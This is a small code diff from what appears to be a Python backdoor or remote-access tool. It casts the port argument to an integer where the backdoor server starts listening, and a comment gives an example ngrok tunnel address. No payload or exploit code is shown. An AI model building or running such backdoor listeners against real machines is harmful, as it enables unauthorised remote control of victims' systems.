@@ -11,7 +11,7 @@ from src.server import Server
 def main():
     parser, args = createSetupParser()
 
-    servidorBackdoor = Server(args.address, args.port) # Ex: server = Server('0.tcp.ngrok.io', 4321)#
+    servidorBackdoor = Server(args.address, int(args.port)) # Ex: server = Server('0.tcp.ngrok.io', 4321)#
     servidorBackdoor.run() # iniciando escuta e sessões #
 
 
